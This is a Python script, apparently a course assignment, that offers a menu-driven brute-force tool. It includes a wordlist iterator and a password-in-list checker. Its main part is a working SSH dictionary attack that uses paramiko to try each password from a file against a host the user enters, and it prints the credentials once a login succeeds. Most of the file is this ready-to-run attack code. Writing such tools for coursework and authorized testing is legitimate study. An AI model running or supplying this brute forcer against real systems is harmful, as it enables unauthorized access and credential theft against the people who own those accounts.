#!/usr/bin/env python3

# Script Name                           401ops16.py
# Author                                Bill Kachersky
# Date of last revision                 10/26/2021
# Description of purpose                Brute Force Tool Part 2

# Resources and Thanks:
# https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
# https://pexpect.readthedocs.io/en/stable/api/pxssh.html
# https://github.com/codefellows/seattle-cyber-401d3/blob/main/class-16/challenges/DEMO.md
# https://www.geeksforgeeks.org/python-how-to-search-for-a-string-in-text-files/

# Import libraries
import time
import paramiko, sys, os, socket
import getpass




# Declare functions
def iterator():
    filepath = input("Enter your dictionary filepath:\n")
    #filepath = '/home/billkach/rockyou.txt' #test filepath
    
    file = open(filepath, 'r', encoding = "ISO-8859-1")
    line = file.readline()
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    file.close()

def check_password():
    user_pass = input("Input the most common password you can think of, and see if we can find it:\n")
    filepath = input("Enter your dictionary filepath:\n")

    file1 = open(filepath, "r")

    flag = 0
    index = 0

    for line in file1:
        index += 1

        if user_pass in line:

            flag = 1
            break

    if flag == 0:
        print('Password', user_pass, 'not found')
    else:
        print('Password', user_pass, 'found on line', index)


def ssh():
    global host, user, line, input_file
    line ="\n-------------------------------------------------------\n"

    try:
        host = input(r"[*] Enter Host IP: ")
        user = input(r"[*] Enter SSH Username: ")
        input_file = input(r"[*] Enter SSH Password File: ")

        if os.path.exists(input_file) == False:
            print("\n[*] File Path Does Not Exist.")
            sys.exit(4)
        

    except KeyboardInterrupt:
        print("\n\n[*] User Requested An Interrupt")
        sys.exit(3)

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=user, password=password)
    except paramiko.AuthenticationException:
        # Authentication Failed
        code = 1
    except socket.error as e:
        # Connection Failed ...Host Down"
        code = 2

    ssh.close()
    return code

def ssh_pass():
    iteratefile = open(input_file, 'r', encoding = "ISO-8859-1")

    print("")

    for i in iteratefile.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(password)

            if response == 0:
                print("%s[*] User: %s [*] Pass Found: %s%s" % (line, user, password, line))
                sys.exit(0)
            elif response == 1:
                print("[*] User: %s [*] Pass: %s => Login Incorrect! <=" % (user, password))
            elif response == 2:
                print("[*] Connection Could Not Be Established to Address: %s" % (host))
                sys.exit(2)
        except Exception as e:
            print(e)
            pass

    iteratefile.close()


# Main

if __name__ == "__main__": # when my computer runs this file...do this stuff
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - SSH Brute Force Attack
4 - Exit
    Please enter a number: 
""")
        if (mode == "1"):
            iterator()
        elif (mode == "2"):
            check_password()
        elif (mode == '3'):
            ssh()
            ssh_pass()
        elif (mode == '4'):
            break
        else:
            print("Invalid selection...") 


# End
